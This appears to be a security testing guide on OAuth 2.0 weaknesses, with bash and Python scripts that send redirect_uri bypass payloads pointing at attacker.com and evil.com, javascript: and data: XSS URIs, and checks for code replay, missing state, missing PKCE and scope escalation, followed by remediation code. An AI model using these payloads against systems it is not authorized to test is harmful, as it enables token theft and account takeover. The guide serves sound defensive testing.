# WSTG-AUTHZ-05: Testing for OAuth Weaknesses

## Test ID
WSTG-AUTHZ-05

## Test Name
Testing for OAuth Weaknesses

## High-Level Description

OAuth 2.0 is an authorization framework that enables applications to obtain limited access to user accounts. Misconfigurations or implementation flaws in OAuth can lead to account takeover, token theft, unauthorized access, and data exposure. This test identifies vulnerabilities in OAuth implementations including improper redirect URI validation, insecure token handling, CSRF issues, and authorization code injection.

---

## What to Check

### OAuth Components

- [ ] Authorization endpoint security
- [ ] Token endpoint security
- [ ] Redirect URI validation
- [ ] State parameter implementation
- [ ] PKCE implementation
- [ ] Token storage and handling
- [ ] Scope validation

### Common Vulnerabilities

| Vulnerability | Description |
|---------------|-------------|
| Open redirect | Unvalidated redirect_uri |
| CSRF | Missing/weak state parameter |
| Token leakage | Tokens in URL/referrer |
| Authorization code injection | Reusing codes |
| Scope escalation | Accessing beyond granted scope |
| Implicit grant issues | Token in URL fragment |

---

## How to Test

### Step 1: Identify OAuth Implementation

```bash
# Find OAuth endpoints
curl -s "https://target.com/.well-known/oauth-authorization-server" | jq '.'
curl -s "https://target.com/.well-known/openid-configuration" | jq '.'

# Common OAuth endpoints
endpoints=(
    "/oauth/authorize"
    "/oauth2/authorize"
    "/auth/authorize"
    "/oauth/token"
    "/oauth2/token"
    "/auth/token"
    "/oauth/callback"
    "/auth/callback"
)

for endpoint in "${endpoints[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint")
    if [ "$status" != "404" ]; then
        echo "Found: $endpoint (Status: $status)"
    fi
done
```

### Step 2: Test Redirect URI Validation

```bash
#!/bin/bash
# Test redirect_uri bypass techniques

CLIENT_ID="your_client_id"
BASE_URL="https://target.com"
VALID_REDIRECT="https://client.example.com/callback"
ATTACKER_SITE="https://attacker.com"

# Test various bypass payloads
payloads=(
    # Open redirect
    "$ATTACKER_SITE"
    "https://attacker.com/callback"

    # Subdomain bypass
    "https://attacker.example.com/callback"
    "https://example.com.attacker.com/callback"

    # Path traversal
    "$VALID_REDIRECT/../../../attacker.com"
    "$VALID_REDIRECT/../../attacker.com"

    # Parameter pollution
    "$VALID_REDIRECT?next=$ATTACKER_SITE"
    "$VALID_REDIRECT#$ATTACKER_SITE"

    # URL encoding
    "https://client.example.com%2F@attacker.com/callback"
    "https://client.example.com%00.attacker.com/callback"

    # Unicode bypass
    "https://client.example.com%E3%80%82attacker.com"

    # Localhost bypass
    "http://localhost/callback"
    "http://127.0.0.1/callback"

    # Data/javascript URIs
    "data:text/html,<script>alert(1)</script>"
    "javascript:alert(1)"

    # Partial match bypass
    "https://client.example.com.evil.com/callback"
    "https://notclient.example.com/callback"
)

for payload in "${payloads[@]}"; do
    url="$BASE_URL/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$payload&response_type=code&scope=openid"

    response=$(curl -s -I "$url" 2>/dev/null | grep -i "location:")

    if echo "$response" | grep -qi "attacker\|evil\|localhost"; then
        echo "[VULN] Redirect bypass: $payload"
    fi
done
```

### Step 3: Test State Parameter (CSRF Protection)

```bash
# Test missing state parameter
curl -s "https://target.com/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=code&scope=openid"
# If no error, state may not be required

# Test with empty state
curl -s "https://target.com/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=code&state=&scope=openid"

# Test callback with manipulated state
curl -s "https://target.com/oauth/callback?code=AUTH_CODE&state=attacker_controlled_state"

# Check if state is properly validated
# - Should be cryptographically random
# - Should be tied to user session
# - Should be single-use
```

### Step 4: Test PKCE Implementation

```bash
#!/bin/bash
# Test PKCE (Proof Key for Code Exchange)

# Generate code verifier and challenge
CODE_VERIFIER=$(openssl rand -base64 32 | tr -dc 'a-zA-Z0-9-._~' | head -c 43)
CODE_CHALLENGE=$(echo -n "$CODE_VERIFIER" | openssl sha256 -binary | base64 | tr '/+' '_-' | tr -d '=')

echo "Code Verifier: $CODE_VERIFIER"
echo "Code Challenge: $CODE_CHALLENGE"

# Test authorization without PKCE
response=$(curl -s "https://target.com/oauth/authorize?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=code&scope=openid")
# If works without code_challenge, PKCE may not be required

# Test token endpoint without code_verifier
curl -s -X POST "https://target.com/oauth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID"
# If works without code_verifier, PKCE is not enforced

# Test with wrong code_verifier
curl -s -X POST "https://target.com/oauth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID&code_verifier=wrong_verifier"
```

### Step 5: Test Authorization Code Issues

```bash
# Test authorization code replay
AUTH_CODE="captured_code"

# First use
curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET"

# Second use (should fail)
curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET"
# If second request works, codes are not invalidated after use

# Test code with different client_id
curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=different_client&client_secret=$CLIENT_SECRET"

# Test code with different redirect_uri
curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=https://different.com/callback&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET"
```

### Step 6: Test Token Handling

```bash
# Test access token in URL (should be in header)
curl -s "https://target.com/api/user?access_token=$TOKEN"

# Check token in referrer header (token leakage)
# Look at response headers after OAuth flow

# Test token scope escalation
# If granted scope is "read", try accessing write endpoints
curl -s -X POST "https://target.com/api/user/update" \
    -H "Authorization: Bearer $READ_ONLY_TOKEN" \
    -d '{"name": "test"}'

# Test refresh token rotation
REFRESH_TOKEN="refresh_token_here"
response=$(curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=$CLIENT_ID")

new_refresh=$(echo "$response" | jq -r '.refresh_token')
# Try using old refresh token again (should fail after rotation)
curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=$CLIENT_ID"
```

### Step 7: Comprehensive OAuth Tester

```python
#!/usr/bin/env python3
import requests
import hashlib
import base64
import secrets
import urllib.parse

class OAuthTester:
    def __init__(self, base_url, client_id, client_secret=None, redirect_uri=None):
        self.base_url = base_url
        self.client_id = client_id
        self.client_secret = client_secret
        self.redirect_uri = redirect_uri or "https://example.com/callback"
        self.session = requests.Session()
        self.vulnerabilities = []

    def test_redirect_uri_bypass(self):
        """Test redirect_uri validation"""
        print("\n[*] Testing redirect_uri validation...")

        bypasses = [
            # Open redirect
            "https://attacker.com",
            "https://attacker.com/callback",

            # Subdomain manipulation
            f"https://{self.redirect_uri.split('//')[1].split('/')[0]}.attacker.com",
            f"https://attacker.{self.redirect_uri.split('//')[1]}",

            # Path confusion
            f"{self.redirect_uri}@attacker.com",
            f"{self.redirect_uri}%40attacker.com",
            f"{self.redirect_uri}#@attacker.com",
            f"{self.redirect_uri}?.attacker.com",

            # Protocol bypass
            f"http://{self.redirect_uri.split('//')[1]}",

            # Localhost
            "http://localhost/callback",
            "http://127.0.0.1/callback",
            "http://[::1]/callback",
        ]

        for bypass in bypasses:
            try:
                params = {
                    "client_id": self.client_id,
                    "redirect_uri": bypass,
                    "response_type": "code",
                    "scope": "openid"
                }

                response = self.session.get(
                    f"{self.base_url}/oauth/authorize",
                    params=params,
                    allow_redirects=False
                )

                if response.status_code in [302, 303]:
                    location = response.headers.get('Location', '')
                    if 'attacker' in location.lower() or 'localhost' in location.lower():
                        print(f"[VULN] Redirect bypass: {bypass}")
                        self.vulnerabilities.append({
                            "type": "redirect_uri_bypass",
                            "payload": bypass
                        })
                elif response.status_code == 200 and 'error' not in response.text.lower():
                    print(f"[CHECK] May work: {bypass}")

            except Exception as e:
                pass

        return self.vulnerabilities

    def test_state_parameter(self):
        """Test CSRF protection via state parameter"""
        print("\n[*] Testing state parameter...")

        # Test without state
        try:
            params = {
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "response_type": "code",
                "scope": "openid"
            }

            response = self.session.get(
                f"{self.base_url}/oauth/authorize",
                params=params,
                allow_redirects=False
            )

            if response.status_code in [302, 303] and 'error' not in response.headers.get('Location', ''):
                print("[VULN] State parameter not required")
                self.vulnerabilities.append({
                    "type": "missing_state",
                    "description": "State parameter is not required"
                })

        except Exception as e:
            print(f"[ERROR] {e}")

        # Test with empty state
        try:
            params["state"] = ""
            response = self.session.get(
                f"{self.base_url}/oauth/authorize",
                params=params,
                allow_redirects=False
            )

            if response.status_code in [302, 303]:
                print("[VULN] Empty state accepted")
                self.vulnerabilities.append({
                    "type": "empty_state",
                    "description": "Empty state parameter accepted"
                })

        except:
            pass

        return self.vulnerabilities

    def test_pkce(self):
        """Test PKCE implementation"""
        print("\n[*] Testing PKCE enforcement...")

        # Generate PKCE parameters
        code_verifier = secrets.token_urlsafe(32)
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode()).digest()
        ).decode().rstrip('=')

        # Test without PKCE
        try:
            params = {
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "response_type": "code",
                "scope": "openid"
            }

            response = self.session.get(
                f"{self.base_url}/oauth/authorize",
                params=params,
                allow_redirects=False
            )

            if response.status_code in [302, 303] and 'error' not in response.headers.get('Location', ''):
                print("[WARN] PKCE not required (may be OK for confidential clients)")

        except Exception as e:
            pass

        return self.vulnerabilities

    def test_implicit_flow(self):
        """Test implicit flow vulnerabilities"""
        print("\n[*] Testing implicit flow...")

        # Implicit flow exposes token in URL fragment
        try:
            params = {
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "response_type": "token",
                "scope": "openid"
            }

            response = self.session.get(
                f"{self.base_url}/oauth/authorize",
                params=params,
                allow_redirects=False
            )

            if response.status_code in [302, 303]:
                location = response.headers.get('Location', '')
                if '#access_token=' in location:
                    print("[INFO] Implicit flow enabled (tokens in URL - risky)")
                    self.vulnerabilities.append({
                        "type": "implicit_flow",
                        "description": "Implicit flow is enabled, tokens exposed in URL"
                    })

        except Exception as e:
            pass

        return self.vulnerabilities

    def test_scope_escalation(self, token, limited_scope_endpoints, elevated_scope_endpoints):
        """Test if token with limited scope can access elevated endpoints"""
        print("\n[*] Testing scope escalation...")

        headers = {"Authorization": f"Bearer {token}"}

        for endpoint in elevated_scope_endpoints:
            try:
                response = self.session.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers
                )

                if response.status_code == 200:
                    print(f"[VULN] Scope escalation: {endpoint}")
                    self.vulnerabilities.append({
                        "type": "scope_escalation",
                        "endpoint": endpoint
                    })

            except:
                pass

        return self.vulnerabilities

    def generate_report(self):
        """Generate OAuth testing report"""
        print("\n" + "="*60)
        print("OAUTH SECURITY TESTING REPORT")
        print("="*60)

        if not self.vulnerabilities:
            print("\nNo vulnerabilities found.")
            return

        print(f"\nTotal findings: {len(self.vulnerabilities)}\n")

        for vuln in self.vulnerabilities:
            print(f"[{vuln['type'].upper()}]")
            for key, value in vuln.items():
                if key != 'type':
                    print(f"  {key}: {value}")
            print()

# Usage
tester = OAuthTester(
    base_url="https://target.com",
    client_id="your_client_id",
    redirect_uri="https://client.example.com/callback"
)

tester.test_redirect_uri_bypass()
tester.test_state_parameter()
tester.test_pkce()
tester.test_implicit_flow()
tester.generate_report()
```

---

## Tools

### OAuth Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Traffic interception | Analyze OAuth flows |
| **OWASP ZAP** | Security scanner | OAuth testing |
| **oauth-tools** | OAuth testing | Specialized tests |
| **Postman** | API testing | OAuth flows |

### Token Analysis

| Tool | Description |
|------|-------------|
| **jwt.io** | JWT decoder |
| **jwt_tool** | JWT attacks |
| **jq** | JSON parsing |

---

## Remediation Guide

### 1. Strict Redirect URI Validation

```python
from urllib.parse import urlparse

class RedirectURIValidator:
    def __init__(self, allowed_uris):
        self.allowed_uris = set(allowed_uris)

    def validate(self, redirect_uri):
        """Strictly validate redirect URI"""
        # Exact match only
        if redirect_uri not in self.allowed_uris:
            return False

        # Additional parsing validation
        parsed = urlparse(redirect_uri)

        # Must be HTTPS (except localhost for dev)
        if parsed.scheme != 'https':
            if not (parsed.scheme == 'http' and parsed.hostname == 'localhost'):
                return False

        # No fragments allowed in redirect_uri
        if parsed.fragment:
            return False

        return True

# Usage in authorization endpoint
@app.route('/oauth/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')

    validator = RedirectURIValidator(client.allowed_redirect_uris)

    if not validator.validate(redirect_uri):
        return jsonify({"error": "invalid_redirect_uri"}), 400

    # Continue with authorization
```

### 2. Proper State Implementation

```python
import secrets
import hashlib
from flask import session

class OAuthStateManager:
    @staticmethod
    def generate_state():
        """Generate cryptographically secure state"""
        state = secrets.token_urlsafe(32)

        # Store hash of state in session
        session['oauth_state'] = hashlib.sha256(state.encode()).hexdigest()

        return state

    @staticmethod
    def validate_state(received_state):
        """Validate state from callback"""
        stored_hash = session.pop('oauth_state', None)

        if not stored_hash:
            return False

        received_hash = hashlib.sha256(received_state.encode()).hexdigest()

        return secrets.compare_digest(stored_hash, received_hash)

# Usage
@app.route('/oauth/authorize')
def authorize():
    state = OAuthStateManager.generate_state()
    # Include state in authorization URL

@app.route('/oauth/callback')
def callback():
    state = request.args.get('state')

    if not OAuthStateManager.validate_state(state):
        return jsonify({"error": "invalid_state"}), 400

    # Process callback
```

### 3. PKCE Implementation

```python
import base64
import hashlib
import secrets

class PKCEManager:
    @staticmethod
    def generate_code_verifier():
        """Generate code verifier (43-128 chars)"""
        return secrets.token_urlsafe(32)

    @staticmethod
    def generate_code_challenge(code_verifier, method='S256'):
        """Generate code challenge from verifier"""
        if method == 'S256':
            digest = hashlib.sha256(code_verifier.encode()).digest()
            return base64.urlsafe_b64encode(digest).decode().rstrip('=')
        elif method == 'plain':
            return code_verifier
        else:
            raise ValueError(f"Unsupported method: {method}")

    @staticmethod
    def verify_code_challenge(code_verifier, code_challenge, method='S256'):
        """Verify code verifier against stored challenge"""
        expected = PKCEManager.generate_code_challenge(code_verifier, method)
        return secrets.compare_digest(expected, code_challenge)

# Token endpoint
@app.route('/oauth/token', methods=['POST'])
def token():
    code = request.form.get('code')
    code_verifier = request.form.get('code_verifier')

    # Get stored code challenge
    auth_code = AuthorizationCode.query.filter_by(code=code).first()

    if auth_code.code_challenge:
        if not code_verifier:
            return jsonify({"error": "code_verifier required"}), 400

        if not PKCEManager.verify_code_challenge(
            code_verifier,
            auth_code.code_challenge,
            auth_code.code_challenge_method
        ):
            return jsonify({"error": "invalid_code_verifier"}), 400

    # Issue token
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Open redirect in OAuth | 6.1 | Medium |
| Missing state (CSRF) | 8.8 | High |
| Authorization code reuse | 7.5 | High |
| Token in URL (leakage) | 6.5 | Medium |
| Missing PKCE | 7.5 | High |
| Scope escalation | 8.1 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-601** | Open Redirect | redirect_uri bypass |
| **CWE-352** | CSRF | Missing state parameter |
| **CWE-200** | Information Exposure | Token leakage |
| **CWE-285** | Improper Authorization | Scope issues |

---

## References

- [OWASP OAuth Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [RFC 7636 - PKCE](https://tools.ietf.org/html/rfc7636)
- [PortSwigger OAuth](https://portswigger.net/web-security/oauth)

---

## Checklist

```
[ ] OAuth endpoints identified
[ ] Redirect URI validation tested
[ ] State parameter tested
[ ] PKCE implementation checked
[ ] Authorization code reuse tested
[ ] Token handling analyzed
[ ] Implicit flow risks assessed
[ ] Scope validation tested
[ ] Token leakage checked
[ ] Refresh token rotation tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
